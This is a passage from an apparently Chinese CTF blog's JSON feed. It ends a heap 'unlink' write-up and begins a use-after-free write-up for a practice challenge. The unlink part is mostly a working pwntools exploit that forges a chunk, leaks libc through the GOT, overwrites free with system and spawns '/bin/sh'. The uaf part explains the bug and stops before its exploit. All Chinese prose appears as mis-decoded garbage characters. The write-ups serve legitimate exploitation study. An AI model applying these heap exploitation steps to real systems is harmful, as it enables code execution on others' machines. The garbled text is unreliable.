keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b\"1\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">add_item</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"2\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the length of item name:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the name of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">,</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"3\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the index of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the length of item name:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the new name of the item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the index of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># To stop merging chunk</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>ptr<span class=\"token operator\">=</span><span class=\"token number\">0x6020c8</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>fd<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>bk<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>bk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>fake_chunk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>free_got<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"free_got:%x\"</span><span class=\"token punctuation\">,</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>free_addr<span class=\"token operator\">=</span>lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"free_addr:%x\"</span><span class=\"token operator\">%</span>free_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span>free_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>libc_base<span class=\"token operator\">=</span>free_addr<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_addr:%x\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>system_addr<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system_addr:%x\"</span><span class=\"token punctuation\">,</span>system_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#æ”¹å†™ got è¡¨å†…å®¹</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/unlinkpic/image-20230811135415349.png\" alt=\"image-20230811135415349\"></p>\n<h3 id=\"æ€»ç»“\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“\">#</a> æ€»ç»“ï¼š</h3>\n<p>unlink è¿™é‡Œæ¯”è¾ƒçš„ç»•ï¼Œå…¶å®ä¸éš¾ï¼Œä½†æ˜¯æ˜¯å»ç†è§£æŒ‡é’ˆçš„æŒ‡å‘éœ€è¦èŠ±è´¹ä¸€ç‚¹æ—¶é—´ï¼Œç°åœ¨è¿˜æ˜¯ä¸å¤ªç†Ÿç»ƒï¼Œè¦ç»§ç»­åŠ æ²¹ã€‚</p>\n",
            "tags": [
                "å †",
                "unlink"
            ]
        },
        {
            "id": "http://example.com/2023/08/10/uaf/",
            "url": "http://example.com/2023/08/10/uaf/",
            "title": "uaf",
            "date_published": "2023-08-10T01:18:39.000Z",
            "content_html": "<h1 id=\"pwn-uafäº†è§£å­¦ä¹ \"><a class=\"markdownIt-Anchor\" href=\"#pwn-uafäº†è§£å­¦ä¹ \">#</a> PWN uaf äº†è§£å­¦ä¹ </h1>\n<p>åˆšåˆšæ¥è§¦å †ï¼Œå‘ç°åœ¨çœ‹é¢˜çš„æ—¶å€™ï¼Œå¯¹ä¸ C è¯­è¨€è¦æ±‚è¿˜æŒºé«˜ï¼Œéœ€è¦äº†è§£æŒ‡é’ˆæ˜¯æ€ä¹ˆä¸€å›äº‹ã€‚æ‰€ä»¥æˆ‘å†³å®šï¼Œä¸‹é¢ä¸€é“ä¾‹é¢˜è¦å¥½å¥½åˆ†ææºä»£ç ï¼Œäº†è§£å„ä¸ªå‡½æ•°è°ƒç”¨çš„æ„ä¹‰ã€‚</p>\n<h2 id=\"é¦–å…ˆå…ˆå£°æ˜ä¸€ä¸‹ä»€ä¹ˆå«uaf\"><a class=\"markdownIt-Anchor\" href=\"#é¦–å…ˆå…ˆå£°æ˜ä¸€ä¸‹ä»€ä¹ˆå«uaf\">#</a> é¦–å…ˆå…ˆå£°æ˜ä¸€ä¸‹ä»€ä¹ˆå« uafï¼š</h2>\n<p>å‚è€ƒ<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8=\"> ctfwiki</span></p>\n<p>åŸç† <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8jXzE=\">Â¶</span></p>\n<p>ç®€å•çš„è¯´ï¼ŒUse After Free å°±æ˜¯å…¶å­—é¢æ‰€è¡¨è¾¾çš„æ„æ€ï¼Œå½“ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾ä¹‹åå†æ¬¡è¢«ä½¿ç”¨ã€‚ä½†æ˜¯å…¶å®è¿™é‡Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µ</p>\n<ul>\n<li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒã€‚</li>\n<li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆ<strong>ç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬</strong>ã€‚</li>\n<li>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œ<strong>å°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</strong>ã€‚</li>\n</ul>\n<p>è€Œæˆ‘ä»¬ä¸€èˆ¬æ‰€æŒ‡çš„ <strong>Use After Free</strong> æ¼æ´ä¸»è¦æ˜¯åä¸¤ç§ã€‚æ­¤å¤–ï¼Œ<strong>æˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸º dangling pointerã€‚</strong></p>\n<p><em>é€šè¿‡äº†è§£äº†åŸç†ï¼Œæˆ‘ä»¬å‘ç° uaf æ˜¯ç”±äºä½¿ç”¨åå†æ¬¡ free æ²¡æœ‰å»ç½®ç©ºæŒ‡é’ˆï¼Œå¯¼è‡´ä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ç¨‹åºä¼šå†æ¬¡åˆ°æŒ‡é’ˆæ‰€æŒ‡å‘çš„å†…å®¹ã€‚</em></p>\n<p>æ¥ä¸‹æ¥æˆ‘ä»¬é€šè¿‡ä¸€é“ä¾‹é¢˜å»äº†è§£ä¸€ä¸‹ uaf æ¼æ´çš„åˆ©ç”¨ã€‚</p>\n<h3 id=\"é¢˜ç›®æ¥æº\"><a class=\"markdownIt-Anchor\" href=\"#é¢˜ç›®æ¥æº\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2FjdGZfMjAxOV9iYWJ5aGVhcA==\">é¢˜ç›®æ¥æº</span></h3>\n<h4 id=\"é¦–å…ˆæ£€æŸ¥ç¨‹åºä¿æŠ¤æªæ–½\"><a class=\"markdownIt-Anchor\" href=\"#é¦–å…ˆæ£€æŸ¥ç¨‹åºä¿æŠ¤æªæ–½\">#</a> é¦–å…ˆæ£€æŸ¥ç¨‹åºä¿æŠ¤æªæ–½ï¼š</h4>\n<p><img data-src=\"/img/uafpic/image-20230810073539360.png\" alt=\"image-20230810073539360\"></p>\n<p>å“¦ï¼Œå¯¹äº†ã€‚è¿™é‡Œä¸ºå•¥ runpath çš„è·¯å¾„æ˜¯æˆ‘æœ¬åœ°çš„åŸå› æ˜¯ï¼Œæˆ‘ç”¨ patchelf æ”¹äº†ï¼Œå°†ä»–å˜æˆ ubuntu16.04 ç‰ˆæœ¬çš„ glibcï¼Œä¸ºäº†å»äº†è§£ä¸€ä¸‹ fastbins çš„ä½œç”¨ï¼ˆå…¶å®ä¸ç”¨æ”¹ä¹Ÿå¯ä»¥ï¼Œåœ¨è°ƒè¯• 18.04 çš„ glibc ç‰ˆæœ¬ï¼Œå‘ç°å…¶å®å˜åŒ–ä¸å¤§ã€‚</p>\n<h4 id=\"è¿è¡Œç¨‹åºå»äº†è§£åŠŸèƒ½\"><a class=\"markdownIt-Anchor\" href=\"#è¿è¡Œç¨‹åºå»äº†è§£åŠŸèƒ½\">#</a> è¿è¡Œç¨‹åºï¼Œå»äº†è§£åŠŸèƒ½ï¼š</h4>\n<p>è¿è¡Œç¨‹åºï¼Œå‘ç° menuï¼Œæœ‰ 4 ä¸ª nodeã€‚</p>\n<p><img data-src=\"/img/uafpic/image-20230810073909996.png\" alt=\"image-20230810073909996\"></p>\n<ol>\n<li>é€‰æ‹© Create something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074007769.png\" alt=\"image-20230810074007769\"></p>\n<ol start=\"2\">\n<li>é€‰æ‹© Print something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074030177.png\" alt=\"image-20230810074030177\"></p>\n<ol start=\"3\">\n<li>é€‰æ‹© Delete something, ä¹‹ååœ¨ Print something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074149061.png\" alt=\"image-20230810074149061\"></p>\n<p>è¿™ä¹Ÿå°±æ˜¯è¿™ç¨‹åºçš„ä¸»è¦åŠŸèƒ½äº†ã€‚</p>\n<h4 id=\"æ”¾å…¥idaè¿›è¡Œå‡½æ•°åˆ†æ\"><a class=\"markdownIt-Anchor\" href=\"#æ”¾å…¥idaè¿›è¡Œå‡½æ•°åˆ†æ\">#</a> æ”¾å…¥ IDAï¼Œè¿›è¡Œå‡½æ•°åˆ†æï¼š</h4>\n<blockquote>\n<ul>\n<li>\n<p>main å‡½æ•°:</p>\n<p>æ²¡ä»€ä¹ˆå¥½è®²çš„ï¼Œä¸»è¦æ˜¯å»è°ƒç”¨å‡½æ•°åŠŸèƒ½ã€‚</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810075032398.png\" alt=\"image-20230810075032398\"></p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>add å‡½æ•°ï¼š</p>\n<p>è¿™ä¸€ä¸ª node å¯ä»¥çœ‹è§ä¼šç”³è¯·ä¸¤æ¬¡å †ç©ºé—´ï¼Œç¬¬ä¸€æ¬¡æ˜¯ 0x10 çš„ï¼Œç¬¬äºŒæ¬¡æ˜¯æˆ‘ä»¬è¾“å…¥çš„</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810080910781.png\" alt=\"image-20230810080910781\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810081834751.png\" alt=\"image-20230810081834751\"></p>\n<p>è¿™å°±æ˜¯ add åçš„ chunkï¼Œä½†æ˜¯ä¸ºå•¥ç¬¬ä¸€ä¸ªå—å†…å­˜æœ‰ä¸ªåœ°æ–¹æˆ‘æ²¡æ ‡æ³¨å†…å®¹ï¼Œå› ä¸ºæˆ‘æš‚æ—¶ä¸çŸ¥é“ã€‚ä½†æ˜¯æˆ‘åæœŸè°ƒè¯•å‘ç°åº”è¯¥æ˜¯å­—ç¬¦ä¸²çš„åœ°å€ã€‚</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>delete å‡½æ•°ï¼š</p>\n<p>delete ä¼šæ ¹æ®ç»™å®šçš„ç´¢å¼•æ¥é‡Šæ”¾å¯¹åº”çš„ noteã€‚ä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨åˆ é™¤çš„æ—¶å€™ï¼Œåªæ˜¯å•çº¯è¿›è¡Œäº† freeï¼Œè€Œæ²¡æœ‰è®¾ç½®ä¸º NULLï¼Œé‚£ä¹ˆæ˜¾ç„¶ï¼Œè¿™é‡Œæ˜¯å­˜åœ¨ Use After Free çš„æƒ…å†µçš„ã€‚</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810083828105.png\" alt=\"image-20230810083828105\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810084236274.png\" alt=\"image-20230810084236274\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810084217308.png\" alt=\"image-20230810084217308\"></p>\n<p>æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨ uafï¼Œå»ç”³è¯· 0x10 å¤§å°çš„ç©ºé—´ï¼Œå»è¦†å†™å †çš„æŒ‡é’ˆå³å¯ï¼ˆä¸ºä½•å»ç”³è¯· 0x10 å‘¢ï¼Œæˆ‘çš„ç†è§£å°±æ˜¯ï¼Œå»ç”³è¯· fastbins é‡Œé¢ç›¸åŒå¤§å°çš„ chunkï¼Œä¾¿äºå†æ¬¡åˆ©ç”¨æŒ‡é’ˆçš„ä½œç”¨ï¼Œä»è€Œæ§åˆ¶ç¨‹åºçš„æ§åˆ¶æµã€‚ï¼‰</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>show å‡½æ•°ï¼š</p>\n<p>è¿™é‡Œé¢å”¯ä¸€çš„é‡ç‚¹å°±æ˜¯é‚£ä¸ªæ³¨é‡Šï¼Œå› ä¸ºé€šè¿‡è¿™é‡Œï¼Œå»æ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼Œå°±èƒ½å®ç°æ§åˆ¶ã€‚æ¯”å¦‚ ptr [1] å¤„æ˜¯ system å‡½æ•°çš„åœ°å€ï¼Œprt [[0] å¤„æ˜¯ binsh å­—ç¬¦ä¸²çš„åœ°å€ï¼Œé‚£æˆ‘ä»¬å°±èƒ½å®ç° system (â€™/bin/shâ€™) çš„ä½œç”¨ã€‚</p>\n<p><img data-src=\"/img/uafpic/image-20230810085041491.png\" alt=\"image-20230810085041491\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>æ¥ä¸‹æ¥æ˜¯æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼š<br>\nç”³è¯· note0ï¼ˆå¤§å°ä¸º 0x40ï¼‰ï¼šåŒ…æ‹¬ put0 å’Œ content0<br>\n ç”³è¯· note1 (å¤§å°ä¸º 0x40) ï¼šåŒ…æ‹¬ put1 å’Œ content1<br>\n é‡Šæ”¾ note0ï¼šåŒ…æ‹¬ free content0 å’Œ free put0<br>\n é‡Šæ”¾ note1ï¼šåŒ…æ‹¬ free content1 å’Œ free put1</p>\n</blockquote>\n<p>ç”±äº put æ®µè·Ÿ content æ®µçš„å¤§å°æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥ä»–ä»¬æ˜¯åœ¨ bin é‡Œé¢æ˜¯ä¸¤æ¡é“¾ï¼šå¦‚æœä½ ç”³è¯·çš„ chunk å¤§å°æ˜¯ 0x10ï¼Œé‚£ä¹ˆæ˜¯ä» put çš„é‚£æ¡é“¾ç”³è¯·ã€‚å¦‚æœä½ ç”³è¯·çš„ chunk å¤§å°æ˜¯ 0x20ï¼Œé‚£ä¹ˆå°±æ˜¯ä» content çš„é‚£æ¡é“¾ç”³è¯·ã€‚</p>\n<p>æ‰€ä»¥æˆ‘ä»¬å†æ¬¡ç”³è¯·è¦å»ç”³è¯· 0x10 å¤§å°</p>\n<p>ç”³è¯· note2ï¼ˆå¤§å°ä¸º 0x10ï¼‰ï¼šåˆ™ä¼šç”³è¯·ä¸€ä¸ª put2 ä¸€ä¸ª content2. ç”±äº put2 å’Œ content2 å¤§å°éƒ½ä¸º 0x10ï¼Œæ‰€ä»¥éƒ½ä¼šä» put é‚£æ¡é“¾ä¸Šé¢ç”³è¯·ã€‚<br>\næ‰€ä»¥ï¼Œput2 ç”³è¯·åˆ°çš„æ˜¯ put0 çš„ä½ç½®ï¼Œcontent2 ç”³è¯·åˆ°çš„æ˜¯ put1 çš„ä½ç½®ã€‚</p>\n<p>å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬å¾€ content2 é‡Œé¢å¡«å…¥ system çš„åœ°å€å’Œ binsh åœ°å€ï¼Œä¸å°±ç›¸å½“äºå¾€ note0 çš„ put0 é‡Œå¡«å…¥äº† system å’Œ binshï¼Ÿ<br>\né‚£ä¹ˆæˆ‘ä»¬åœ¨è°ƒç”¨ show (0) çš„æ—¶å€™ï¼Œä¸å°±æ˜¯è°ƒç”¨äº† system å‡½æ•°å—ï¼Ÿ</p>\n<blockquote>\n<p>ä¸ºäº†æ›´åŠ é«˜æ•ˆåœ°åˆ©ç”¨ fast binï¼Œglibc é‡‡ç”¨å•å‘é“¾è¡¨å¯¹å…¶ä¸­çš„æ¯ä¸ª bin è¿›è¡Œç»„ç»‡ï¼Œå¹¶ä¸”<strong>æ¯ä¸ª bin é‡‡å– LIFO ç­–ç•¥</strong></p>\n</blockquote>\n<h4 id=\"æ‰€ä»¥expä¸º\"><a class=\"markdownIt-Anchor\" href=\"#æ‰€ä»¥expä¸º\">#</a> æ‰€ä»¥ exp 